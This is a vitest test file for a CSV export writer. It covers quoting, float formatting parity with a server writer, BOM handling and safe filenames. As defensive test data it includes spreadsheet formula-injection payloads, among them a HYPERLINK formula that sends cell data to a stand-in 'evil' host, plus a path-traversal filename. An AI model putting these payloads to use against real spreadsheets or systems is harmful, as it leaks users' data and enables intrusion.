/** csv.ts tests — the canonical writer (FR-R005 layer 1).
 *
 * Written against the shapes the demo schema actually emits (decimal as
 * "19.99", datetime ISO, FK as bare integer), same rule as openapi.ts:
 * never guessed shapes.
 */
import { describe, expect, it, vi } from "vitest";
import {
  buildCsv,
  csvBlobParts,
  csvCell,
  downloadCsv,
  exportColumns,
  exportFileName,
  tableToCsv,
} from "../csv";
import type { FieldSpec, RecordRow } from "../types";

const f = (name: string, type: FieldSpec["type"] = "text"): FieldSpec => ({
  name,
  type,
  required: false,
  readOnly: false,
});

describe("csvCell — RFC 4180 quoting", () => {
  it("leaves a plain value bare", () => {
    expect(csvCell("Widget")).toBe("Widget");
  });

  it("quotes on comma, quote, CR or LF and doubles embedded quotes", () => {
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("line1\nline2")).toBe('"line1\nline2"');
    expect(csvCell("line1\r\nline2")).toBe('"line1\r\nline2"');
  });

  it("leaves leading/trailing whitespace unquoted — Python QUOTE_MINIMAL parity", () => {
    // Probed against `csv.writer(lineterminator="\r\n")`: '  padded  ' comes
    // out bare. Both export layers must agree byte for byte.
    expect(csvCell("  padded  ")).toBe("  padded  ");
    expect(csvCell("inner  spaces")).toBe("inner  spaces");
  });

  it("renders null and undefined as an empty field, not a word", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
  });

  it("emits machine-readable booleans, not the table's Yes/No", () => {
    expect(csvCell(true)).toBe("true");
    expect(csvCell(false)).toBe("false");
  });

  it("passes a decimal string through without re-flowing it through Number", () => {
    // DRF DecimalField arrives as "19.99"; 19.99 -> String -> could drift.
    expect(csvCell("19.99")).toBe("19.99");
    expect(csvCell(0.1 + 0.2)).toBe("0.30000000000000004");
  });

  it("never truncates — formatCell's 60-char ellipsis is a display rule", () => {
    const long = "x".repeat(300);
    expect(csvCell(long)).toBe(long);
  });

  it("neutralises a leading formula operator in text, but not a real number", () => {
    expect(csvCell('=HYPERLINK("http://evil/"+A1)')).toBe('"\'=HYPERLINK(""http://evil/""+A1)"');
    expect(csvCell("+cmd")).toBe("'+cmd");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell(-5)).toBe("-5"); // a number is a number
    expect(csvCell("normal - dash")).toBe("normal - dash");
  });

  it("keys the guard on the SHAPE of the text, not on the JS type", () => {
    // DRF answers a DecimalField as a STRING, so "-5.00" is data here and the
    // server writer sees a Decimal. Both sides exempt numeric-shaped text,
    // otherwise the two export buttons disagree on every negative price.
    // Layer note: this csvCell also quotes (Python splits guard -> csv_cell and
    // quote -> csv_text), so a comma-bearing cell shows the quoting here only.
    expect(csvCell("-5.00")).toBe("-5.00");
    expect(csvCell("+19.99")).toBe("+19.99");
    expect(csvCell("-.5")).toBe("-.5");
    expect(csvCell("-7,25")).toBe('"\'-7,25"'); // a comma is not a number, so guarded + quoted
    expect(csvCell("-2+3")).toBe("'-2+3"); // the classic payload
    expect(csvCell("-IF(1,2,3)")).toBe('"\'-IF(1,2,3)"');
    expect(csvCell("-")).toBe("'-"); // a lone lead character is not a number
  });
});

describe("the shared golden document — same bytes as the server writer", () => {
  it("reproduces plugin/tests/test_csv_export.py::test_the_shared_golden_document", () => {
    // The literal is asserted twice, in two languages, over the same values.
    // Python builds it with csv_text([header] + [[csv_cell(v) …]]); this side
    // with buildCsv(). If one writer drifts, that suite goes red and names it.
    // `when` is doubled on purpose — one row an aware datetime, one row the same
    // instant as the TEXT a browser actually receives — because a cell that is
    // text on both sides cannot test the server's datetime rendering at all
    // (that blind spot is divergence #2 in docs/csv-export.md §2).
    const header = ["id", "name", "notes", "active", "total", "when", "weight"];
    const rows = [
      [1, "Widget", "plain", true, "19.99", "2026-10-20T21:00:00Z", 1.0],
      [2, "Gizmo, big", 'say "hi"', false, "-5.00", null, -0.5],
      [3, "line1\nline2", '=HYPERLINK("http://evil/"+A1)', true, "-7.25",
       "2026-10-20T21:00:00Z", 1e-7],
    ];
    expect(buildCsv(header, rows)).toBe(
      "id,name,notes,active,total,when,weight\r\n" +
      "1,Widget,plain,true,19.99,2026-10-20T21:00:00Z,1\r\n" +
      '2,"Gizmo, big","say ""hi""",false,-5.00,,-0.5\r\n' +
      "3,\"line1\nline2\",\"'=HYPERLINK(\"\"http://evil/\"\"+A1)\"," +
      "true,-7.25,2026-10-20T21:00:00Z,1e-7\r\n",
    );
  });
});

/** The float table from plugin/tests/test_csv_export.py::TestCsvWriterParity.
 *  Same values, same expectations, two languages: this side is the reference
 *  (String() is exactly what layer 1 writes after JSON.parse of a DRF body),
 *  so the server writer is the one this table holds to it. */
const FLOAT_PARITY: [number, string][] = [
  [0.0, "0"],
  [-0.0, "0"],
  [1.0, "1"],
  [100.0, "100"],
  [1e6, "1000000"],
  [19.99, "19.99"],
  [48.5, "48.5"],
  [0.5, "0.5"],
  [1 / 3, "0.3333333333333333"],
  [0.1 + 0.2, "0.30000000000000004"],
  [1e-5, "0.00001"],
  [1e-6, "0.000001"],
  [1e-7, "1e-7"],
  [-1e-9, "-1e-9"],
  [2.5e-13, "2.5e-13"],
  [1e16, "10000000000000000"],
  [1e17, "100000000000000000"],
  [1e20, "100000000000000000000"],
  [1e21, "1e+21"],
  [6.02e23, "6.02e+23"],
  [1e100, "1e+100"],
  [1.7976931348623157e308, "1.7976931348623157e+308"],
  [5e-324, "5e-324"],
  [123456789012345680000.0, "123456789012345680000"],
  [-0.00042, "-0.00042"],
];

describe("csvCell — floats are the browser's own rendering", () => {
  it.each(FLOAT_PARITY)("String(%s) is the byte both export layers write", (value, expected) => {
    expect(csvCell(value)).toBe(expected);
  });

  it("leaves a negative float unguarded — the guard is for text", () => {
    expect(csvCell(-1e-9)).toBe("-1e-9");
    expect(csvCell(-2.0)).toBe("-2");
    expect(csvCell("-1e-9")).toBe("'-1e-9"); // the same characters AS text do guard
  });

  it("writes a float exactly as it arrives off the JSON body", () => {
    // Client-side mirror of the server's TestFloatOverTheWire, over the same
    // switch points the demo rig seeds (shop/management/commands/seed_demo.py):
    // DRF sends a FloatField as a JSON NUMBER, so layer 1's cell is String() of
    // a parsed value — never a re-format of the wire text. Values are written
    // here in JSON's own spelling on purpose: the parse is the premise.
    const parsed = (literal: string) => JSON.parse(`{"w":${literal}}`).w as number;
    expect(parsed("1.0")).toBe(1);
    expect(csvCell(parsed("1.0"))).toBe("1");
    expect(csvCell(parsed("19.99"))).toBe("19.99");
    expect(csvCell(parsed("1e-7"))).toBe("1e-7");
    expect(csvCell(parsed("1e17"))).toBe("100000000000000000"); // Python: "1e+17"
    expect(csvCell(parsed("-0.00042"))).toBe("-0.00042");
    expect(csvCell(parsed("null"))).toBe(""); // NULL weight -> empty
  });
});

describe("buildCsv", () => {
  it("joins rows with CRLF and terminates the document", () => {
    expect(buildCsv(["id", "name"], [[1, "a"], [2, "b"]])).toBe("id,name\r\n1,a\r\n2,b\r\n");
  });

  it("survives an empty row set as a header-only file", () => {
    expect(buildCsv(["id"], [])).toBe("id\r\n");
  });

  it("keeps a ragged cell count visible instead of dropping data", () => {
    expect(buildCsv(["a", "b"], [["x"]])).toBe("a,b\r\nx\r\n");
  });
});

describe("exportColumns", () => {
  it("mirrors the table: json excluded, first six kept, order preserved", () => {
    const model = {
      fields: [f("id", "number"), f("name"), f("meta", "json"), f("a"), f("b"), f("c"), f("d"), f("e")],
    };
    expect(exportColumns(model).map((c) => c.name)).toEqual(["id", "name", "a", "b", "c", "d"]);
  });
});

describe("tableToCsv", () => {
  it("writes header in column order and one line per row", () => {
    const columns = [f("id", "number"), f("total", "number"), f("notes")];
    const rows: RecordRow[] = [
      { id: 1, total: "10.50", notes: "gift, please" },
      { id: 2, total: "20.00" },
    ];
    expect(tableToCsv(columns, rows)).toBe(
      'id,total,notes\r\n1,10.50,"gift, please"\r\n2,20.00,\r\n',
    );
  });

  it("treats an absent field as empty rather than undefined", () => {
    expect(tableToCsv([f("nope")], [{ id: 1 }])).toBe("nope\r\n\r\n");
  });
});

describe("exportFileName", () => {
  it("slugifies a schema-derived label and always ends in .csv", () => {
    expect(exportFileName("Order", "line")).toBe("order-line.csv");
    expect(exportFileName("Product")).toBe("product.csv");
    expect(exportFileName("Ün ïcode  Model")).toBe("n-code-model.csv");
  });

  it("cannot be steered by a hostile model name", () => {
    expect(exportFileName("../../etc/passwd")).toBe("etc-passwd.csv");
    expect(exportFileName("")).toBe("export.csv");
    expect(exportFileName("   ")).toBe("export.csv");
  });
});

describe("csvBlobParts — exactly one BOM", () => {
  it("adds the BOM to a client-written document", () => {
    expect(csvBlobParts("id\r\n1\r\n")).toEqual(["﻿id\r\n1\r\n"]);
  });

  it("does not double the BOM the server already wrote", () => {
    // Layer 2 downloads the endpoint's own bytes, which start with U+FEFF by
    // contract (test_csv_export.py asserts it). Prepending again puts a second
    // BOM in the file, and Excel shows it as "ï»¿id" in the first header cell.
    const fromServer = "﻿id\r\n1\r\n";
    expect(csvBlobParts(fromServer)).toEqual(["﻿id\r\n1\r\n"]);
    expect(csvBlobParts(csvBlobParts(fromServer)[0] as string)).toEqual(["﻿id\r\n1\r\n"]);
  });
});

describe("downloadCsv", () => {
  it("clicks an anchor carrying the filename and the BOM-prefixed body", async () => {
    const create = vi.fn(() => "blob:generated");
    const revoke = vi.fn();
    vi.stubGlobal("URL", Object.assign(Object.create(null), { createObjectURL: create, revokeObjectURL: revoke }));
    const clicked: string[] = [];
    const realClick = HTMLElement.prototype.click;
    HTMLElement.prototype.click = function (this: HTMLElement) {
      if (this.getAttribute("download")) clicked.push(this.getAttribute("download") as string);
    };

    const ok = downloadCsv("orders.csv", "id\r\n1");
    expect(ok).toBe(true);
    expect(clicked).toEqual(["orders.csv"]);

    HTMLElement.prototype.click = realClick;
    vi.unstubAllGlobals();
  });
});
